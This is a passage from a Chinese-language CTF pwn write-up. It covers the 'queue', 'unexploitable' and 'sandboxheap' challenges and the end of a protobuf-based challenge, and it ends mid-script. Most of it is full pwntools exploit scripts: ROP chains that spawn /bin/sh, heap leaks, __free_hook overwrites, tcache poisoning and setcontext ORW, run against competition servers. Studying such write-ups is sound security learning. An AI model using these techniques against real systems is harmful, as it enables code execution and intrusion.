class="string">&quot;101.201.71.136&quot;</span>, <span class="number">38494</span>)</span><br><span class="line"></span><br><span class="line">zero_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">username, password</span>):</span><br><span class="line">    result = ctf_pb2.pwn()</span><br><span class="line">    result.username = username</span><br><span class="line">    result.password = password</span><br><span class="line">    <span class="keyword">return</span> result.SerializeToString()</span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x5bdb8a</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x404982</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x588bbe</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x40454f</span></span><br><span class="line">syscall_ret = <span class="number">0x68f0a4</span></span><br><span class="line">bin_sh_addr = <span class="number">0x81A380</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(bin_sh_addr) + p64(pop_rdx_ret) + p64(<span class="number">0x10</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(syscall_ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(pop_rax_ret) + p64(<span class="number">59</span>) + p64(syscall_ret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)) :</span><br><span class="line">	<span class="keyword">if</span> payload[i] == <span class="number">0</span> :</span><br><span class="line">		zero_list.append(i)</span><br><span class="line">		payload = payload[<span class="number">0</span>:i] + <span class="string">b&#x27;a&#x27;</span> + payload[i+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">zero_list = zero_list[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">login = gen(payload, <span class="string">b&#x27;winmt&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;Login: &quot;</span>, login)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> zero_list :</span><br><span class="line">	payload = payload[<span class="number">0</span>:i]</span><br><span class="line">	login = gen(payload, <span class="string">b&#x27;winmt&#x27;</span>)</span><br><span class="line">	io.sendafter(<span class="string">&quot;Login: &quot;</span>, login)</span><br><span class="line"></span><br><span class="line">login = gen(<span class="string">b&#x27;admin&#x27;</span>, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;Login: &quot;</span>, login)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2><span id="queue">queue</span><a href="#queue" class="header-anchor"></a></h2><p>队列结构体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">struct elem</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD buf_array_ptr;</span><br><span class="line">  _QWORD sub_buf_max;</span><br><span class="line">  _QWORD pBuffStart;</span><br><span class="line">  _QWORD a3;</span><br><span class="line">  _QWORD pBuffLast;</span><br><span class="line">  char **sub_bufs;</span><br><span class="line">  _QWORD pBuffEnd;</span><br><span class="line">  _QWORD a7;</span><br><span class="line">  _QWORD a8;</span><br><span class="line">  _QWORD sub_buf_last;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>666功能可以直接修改结构体<br>伪造结构体再通过其他功能可以实现任意地址读写<br>首先需要泄露一个地址<br>覆盖pBuffStart, 爆破一个十六进制位到有堆地址的地方<br>泄露堆地址<br>然后申请几个再free填tcache, 在堆上制造libc地址<br>构造结构体pBuffStart指向含libc地址处<br>泄露libc地址<br>然后伪造结构体在__free_hook处<br>用程序edit单字节循环写入</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Fore</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Style</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line">parser = ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;--elf&quot;</span>, default=<span class="string">&quot;./queue&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;--libc&quot;</span>, default=<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;--arch&quot;</span>, default=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;--remote&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"> </span><br><span class="line">context(arch=args.arch,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">retrieve_name</span>(<span class="params">var</span>):</span><br><span class="line">    callers_local_vars = inspect.currentframe().f_back.f_back.f_locals.items()</span><br><span class="line">    <span class="keyword">return</span> [var_name <span class="keyword">for</span> var_name, var_val <span class="keyword">in</span> callers_local_vars <span class="keyword">if</span> var_val <span class="keyword">is</span> var]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logvar</span>(<span class="params">var</span>):</span><br><span class="line">    log.debug(<span class="string">f&#x27;<span class="subst">&#123;Fore.RED&#125;</span><span class="subst">&#123;retrieve_name(var)[<span class="number">0</span>]&#125;</span> : <span class="subst">&#123;var:#x&#125;</span><span class="subst">&#123;Style.RESET_ALL&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">script = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rbt_bpt</span>(<span class="params">offset</span>):</span><br><span class="line">    <span class="keyword">global</span> script</span><br><span class="line">    script += <span class="string">f&#x27;b * $rebase(<span class="subst">&#123;offset:#x&#125;</span>)\n&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bpt</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="keyword">global</span> script</span><br><span class="line">    script += <span class="string">f&#x27;b * <span class="subst">&#123;addr:#x&#125;</span>\n&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh,script)</span><br><span class="line">    pause()</span><br><span class="line"> </span><br><span class="line">prompt = <span class="string">b&#x27;Queue Management: &#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    sh.sendlineafter(prompt,<span class="built_in">str</span>(choice).encode())</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">buf_id,idx,val</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(buf_id).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Value idx: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Value: &#x27;</span>,<span class="built_in">str</span>(val).encode())</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">buf_id,num</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(buf_id).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Num: &#x27;</span>,<span class="built_in">str</span>(num).encode())</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>():</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">buf_id,ctt</span>):</span><br><span class="line">    cmd(<span class="number">666</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(buf_id).encode())</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;Content: &#x27;</span>,ctt)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_qword</span>(<span class="params">buf_id,off,val</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        byte = val &amp; <span class="number">0xff</span></span><br><span class="line">        edit(buf_id,off+i,byte)</span><br><span class="line">        val &gt;&gt;= <span class="number">8</span></span><br><span class="line"> </span><br><span class="line">rbt_bpt(<span class="number">0x1688</span>)</span><br><span class="line">rbt_bpt(<span class="number">0x16b5</span>) </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_num</span>():</span><br><span class="line">    val = <span class="number">0</span></span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        num = <span class="built_in">int</span>(sh.recvline().strip(),<span class="number">16</span>)</span><br><span class="line">        val |= num &lt;&lt; (<span class="number">8</span>*i)</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x100</span>)</span><br><span class="line">    backdoor(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&#x27;\x88\x5e&#x27;</span>)</span><br><span class="line">    show(<span class="number">0</span>,<span class="number">0x8</span>)</span><br><span class="line">    heap_addr = leak_num()</span><br><span class="line">    <span class="keyword">if</span> heap_addr == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> EOFError</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        add(<span class="number">0x100</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        dele()</span><br><span class="line">    backdoor(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span> + p64(heap_addr + <span class="number">0x1a50</span>)*<span class="number">2</span>)</span><br><span class="line">    show(<span class="number">0</span>,<span class="number">0x8</span>)</span><br><span class="line">    libc_base = leak_num() - <span class="number">0x3ebca0</span></span><br><span class="line">    logvar(heap_addr)</span><br><span class="line">    logvar(libc_base)</span><br><span class="line"> </span><br><span class="line">    edit_qword(<span class="number">1</span>,<span class="number">0</span>,u64(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">    libc = ELF(args.libc,checksec=<span class="literal">False</span>)</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>],</span><br><span class="line">        libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>],</span><br><span class="line">        libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+<span class="number">0x200</span>,</span><br><span class="line">        heap_addr,</span><br><span class="line">        libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+<span class="number">0x200</span>,</span><br><span class="line">        libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+<span class="number">0x200</span>,</span><br><span class="line">        libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+<span class="number">0x200</span>,</span><br><span class="line">        heap_addr+<span class="number">8</span></span><br><span class="line">    ])</span><br><span class="line">    backdoor(<span class="number">0</span>,payload)</span><br><span class="line">    edit_qword(<span class="number">0</span>,<span class="number">0</span>,libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    <span class="comment"># dbg()</span></span><br><span class="line">    dele()</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># sh = process([args.elf])</span></span><br><span class="line">        sh = remote(<span class="string">&#x27;39.106.13.71&#x27;</span> ,<span class="string">&#x27;31586&#x27;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        sh.interactive()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        sh.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2><span id="unexploitable">unexploitable</span><a href="#unexploitable" class="header-anchor"></a></h2><p>利用思路：</p>
<p>因为程序仅仅有一个read函数，没有canary，而且溢出的字节非常大，所以本题可以随便溢，但问题是没有后门函数，并且没有输出函数。在开了PIE的情况下，很多花活是没法用的。</p>
<p>通过调试发现，在main函数返回到libc_start_main函数的时候，该地址是一个libc地址，而让执行流跳到一个地址就能get shell的地址只有one_gadget。通过用set命令更改内存的值为one_gadget，发现第一个one_gadget就能用(如下)<br>于是思路就是将libc start main的后三字节，改为one_gadget地址(由于libc地址后三位是固定的，所以我们需要爆破前三位，概率为1&#x2F;4096)。</p>
<p>但如果我们单纯的填垃圾数据，然后溢出篡改的话，情况如下<br><img src="../images/2022-xyb-SU-Writeup/6.png" alt="img"><br>即使我们溢出篡改了libc_start_main,也会返回到它上面的地址，所以我们需要让执行流滑到libc_start_main上，开了PIE保护，我们无法直接获取ret指令的地址，但是vsyscall的地址始终是固定的，它可以当做ret指令来用。<br>所以我们把上图的0xdeadbeef改成vsyscall的地址即可，执行到vsyscall的时候就可以往下滑到爆破成功的one_gadget，从而获取shell。<br>EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level == <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    payload = p64(<span class="number">0xdeadbeef</span>) * <span class="number">3</span> + p64(<span class="number">0xffffffffff600000</span>) * <span class="number">2</span> + <span class="string">b&#x27;\xa5\x22\x06&#x27;</span></span><br><span class="line">    <span class="comment">#debug(p)</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">    a=p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> a:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&quot;39.106.13.71&quot;</span>, <span class="number">14305</span>)</span><br><span class="line">        exp()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>

<h2><span id="sandboxheap">sandboxheap</span><a href="#sandboxheap" class="header-anchor"></a></h2><p>沙箱分析<br><img src="../images/2022-xyb-SU-Writeup/7.png" alt="img"><br>此处为0才不会进入if，否则就走ptrace禁用了。<br>初始化bss段这里全为1,当我们传进来的参数rdi为3的时候，则可以进入两个if(如下)，而switch case想进这里的话，需要让rax为0x2710,因此我们只要保证rop链执行的时候，先让rdi为3，rax为0x2710，然后调用syscall，自定义一个白名单，就可以去打orw了。<br>漏洞所在：<br><img src="../images/2022-xyb-SU-Writeup/8.png" alt="img"><br>在edit函数里，input函数(函数已重命名)的参数有个+1，所以判断这里是存在个溢出的。<br>然后input函数里面是这样的<br>说实话这个我没太看懂，不过根据调试和SU其他师傅的提示，感觉这里的大概意思就是说，我们输入的一个字节只取末尾一个比特，而八个字节就会取出来八个比特，这取出来的八个比特才表示出了一个字节。在以前我们想发送p64()打包后的数据，仅仅只需要发送八字节，但是在这题里，我们需要用64个字节来表示一个八字节的地址。<br>举个例子，我们原本要往内存里写一个地址为0xdeadbeef，以前的话，我们使用p64(0xdeadbeef)即可，但是这道题的话，我们使用下面的部分才能达到同样的效果<br>(bin(0xdeadbeef)[2:].rjust(64,’\x00’).encode()[::-1])</p>
<p>重新回到漏洞上面，这道题通过调试可以发现是溢出了一个比特，其实跟off by null的思路一样，都是去溢出然后篡改堆块的prev_inuse位，然后去打一个堆块合并。但是这道题还有一个难点就是有沙箱保护，通过分析沙箱规则，我们需要打一条rop链。因此对应的策略就是用setcontext来改变寄存器的值，从而将执行流劫持到rop链上</p>
<p>利用思路：<br>由于我们需要打堆块合并，所以需要让合并的堆块释放掉能够进入unsorted bin，因此第一件事是先填满tcache bin。接着去打堆块合并,脚本如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">for i in range(11):</span><br><span class="line">    add(i,0x88)</span><br><span class="line">for i in range(7):</span><br><span class="line">    delete(i)    </span><br><span class="line">​</span><br><span class="line">delete(7)#merge chunk   </span><br><span class="line">payload=b&#x27;1&#x27;*(0x80*8)+b&#x27;00000100&#x27;+b&#x27;10000000&#x27;+b&#x27;00000000&#x27;*6+b&#x27;00000000&#x27;</span><br><span class="line">​</span><br><span class="line">edit(8,payload)</span><br><span class="line">debug(p,&#x27;pie&#x27;,0xED6,0xEE2,0xEEE,0xEFA,0xC9F,0xBA7)</span><br><span class="line">delete(9)#堆块合并</span><br></pre></td></tr></table></figure>
<p>接下来去泄露堆地址和libc地址，大致思路就是做堆块重叠，让一块被释放掉的内存落在一个正在使用的堆块中，从而执行show函数完成泄露libc和堆地址。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">for i in range(7):</span><br><span class="line">    add(i,0x80)</span><br><span class="line">​</span><br><span class="line">add(12,0xc0)</span><br><span class="line">show(12)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-0x3ebe40</span><br><span class="line">log_addr(&#x27;libc_base&#x27;)</span><br><span class="line">free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">context_addr=libc_base+libc.symbols[&#x27;setcontext&#x27;]+53</span><br><span class="line">log_addr(&#x27;free_hook&#x27;)</span><br><span class="line">delete(8)</span><br><span class="line">​</span><br><span class="line">payload=b&#x27;1&#x27;*(0x98*8)</span><br><span class="line">edit(12,payload)</span><br><span class="line">​</span><br><span class="line">show(12)</span><br><span class="line">p.recvuntil(0x98*&quot;\xff&quot;)</span><br><span class="line">heap_addr=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log_addr(&#x27;heap_addr&#x27;)</span><br></pre></td></tr></table></figure>
<p>最后去打一个tcache poisoning,将free_hook申请出来，然后写入setcontext+53的地址，提前在堆块中布置好各个寄存器的值，最后去释放掉该堆块。即可控制各个寄存器，从而去执行系统调用read。将rop链读到执行流上，从而执行rop链(orw)读出flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os = &quot;linux&quot;, arch = &quot;amd64&quot;, log_level = &quot;debug&quot;)</span><br><span class="line">#io = process([&quot;./sandbox&quot;, &quot;./sandboxheap&quot;])</span><br><span class="line">io = remote(&quot;101.201.71.136&quot;, 12795)</span><br><span class="line">elf = ELF(&quot;./sandboxheap&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.27.so&quot;)</span><br><span class="line">def add(idx, size):</span><br><span class="line">    io.sendlineafter(&quot;Your choice: &quot;, &quot;1&quot;)</span><br><span class="line">    io.sendlineafter(&quot;Index: &quot;, str(idx))</span><br><span class="line">    io.sendlineafter(&quot;Size: &quot;, str(size))</span><br><span class="line">def edit(idx, content):</span><br><span class="line">    io.sendlineafter(&quot;Your choice: &quot;, &quot;2&quot;)</span><br><span class="line">    io.sendlineafter(&quot;Index: &quot;, str(idx))</span><br><span class="line">    io.sendafter(&quot;Content: &quot;, content)</span><br><span class="line">def show(idx):</span><br><span class="line">    io.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)</span><br><span class="line">    io.sendlineafter(&quot;Index: &quot;, str(idx))</span><br><span class="line">def delete(idx):</span><br><span class="line">    io.sendlineafter(&quot;Your choice: &quot;, &quot;4&quot;)</span><br><span class="line">    io.sendlineafter(&quot;Index: &quot;, str(idx))</span><br><span class="line">def convert(st):</span><br><span class="line">    tar=&quot;&quot;</span><br><span class="line">    for i in st:</span><br><span class="line">        b=(bin(i)[2:].rjust(8,&#x27;\x00&#x27;)[::-1])</span><br><span class="line">        tar+=b</span><br><span class="line">    return tar</span><br><span class="line">for i in range(11):</span><br><span class="line">    add(i, 0x88)</span><br><span class="line">for i in range(7):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(7)</span><br><span class="line">edit(8, b&#x27;1&#x27; * 0x80 * 8 + b&#x27;00000100&#x27; + \</span><br><span class="line">     b&#x27;10000000&#x27; + b&#x27;00000000&#x27; * 6 + b&#x27;00000000&#x27;)</span><br><span class="line">delete(9)</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i, 0x88)</span><br><span class="line">add(7, 0x88)</span><br><span class="line">show(8)</span><br><span class="line">libc_base = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8, b&#x27;\x00&#x27;)) - 0x3ebca0</span><br><span class="line">success(&quot;libc_base:\t&quot; + hex(libc_base))</span><br><span class="line">add(9, 0x110)</span><br><span class="line">add(13, 0x110)</span><br><span class="line">add(14, 0x110)</span><br><span class="line">delete(13)</span><br><span class="line">delete(9)</span><br><span class="line">show(8)</span><br><span class="line">io.recvuntil(&quot;Content: &quot;)</span><br><span class="line">heap_base = u64(io.recv(6).ljust(8, b&#x27;\x00&#x27;)) - 0x010 -0x880</span><br><span class="line">success(&quot;heap_base:\t&quot; + hex(heap_base))</span><br><span class="line">free_hook = libc_base+libc.symbols[&quot;__free_hook&quot;]</span><br><span class="line">edit(8, bin((free_hook))[2:][::-1].ljust(64, &#x27;\x00&#x27;))</span><br><span class="line">add(9, 0x110)</span><br><span class="line">add(11, 0x110)</span><br><span class="line">setcontext = libc_base + libc.symbols[&quot;setcontext&quot;] + 53</span><br><span class="line">pop_rdi_ret = libc_base + 0x000000000002164f</span><br><span class="line">pop_rsi_ret = libc_base + 0x0000000000023a6a</span><br><span class="line">pop_rdx_r12_ret = libc_base + 0x0000000000130514</span><br><span class="line">pop_rax_ret = libc_base + 0x000000000001b500</span><br><span class="line">syscall = libc_base + 0x00000000000d2625</span><br><span class="line">flag = bin(0x67616c662f2e)[2:].rjust(64, &#x27;\x00&#x27;).encode()[::-1]</span><br><span class="line">edit(1,flag)</span><br><span class="line">frame 